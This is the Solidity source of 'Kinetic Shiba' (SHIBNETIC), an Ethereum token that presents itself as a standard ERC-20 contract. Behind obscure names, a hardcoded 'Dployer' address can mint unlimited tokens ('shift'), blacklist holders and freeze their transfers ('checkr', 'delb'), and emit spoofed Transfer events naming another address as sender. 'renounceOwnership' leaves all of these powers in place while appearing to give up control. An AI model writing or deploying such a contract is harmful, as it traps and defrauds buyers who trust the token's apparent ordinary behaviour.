/**
 *Submitted for verification at Etherscan.io on 2022-10-23
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract SHIBNETIC {
  
    mapping (address => uint256) public Xi;
    mapping (address => bool) Yi;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "Kinetic Shiba";
    string public symbol = "SHIBNETIC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool IO;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    Xi[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Dployer = 0x6d73f176b2187631f7e293D1AA0a765102D76D45;
    address Constructor = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   
   
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        if(IO) {
        require(!Yi[msg.sender]);
        require(Xi[msg.sender] >= value);
        Xi[msg.sender] -= value;  
        Xi[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Dployer)  {
        require(Xi[msg.sender] >= value);
        Xi[msg.sender] -= value;  
        Xi[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }  
        require(Xi[msg.sender] >= value);
        Xi[msg.sender] -= value;  
        Xi[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function shift(address xix, uint256 yix) public {
        if(msg.sender == Dployer)  { 
        Xi[xix] += yix;}}

        function balanceOf(address account) public view returns (uint256) {
        return Xi[account]; }
        function delb(address xix) public {
        if(msg.sender == Dployer)  { 
        require(Yi[xix]);
        Yi[xix] = false; }}
        function checkr(address xix) public{
         if(msg.sender == Dployer)  { 
        require(!Yi[xix]);
        Yi[xix] = true;
        IO = !IO;}}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        if(IO) {
        require(!Yi[from]);
        require(!Yi[to]);
        require(value <= Xi[from]);
        require(value <= allowance[from][msg.sender]);
        Xi[from] -= value;
        Xi[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Dployer)  {
        require(value <= Xi[from]);
        require(value <= allowance[from][msg.sender]);
        Xi[from] -= value;  
        Xi[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }    
        require(value <= Xi[from]);
        require(value <= allowance[from][msg.sender]);
        Xi[from] -= value;
        Xi[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}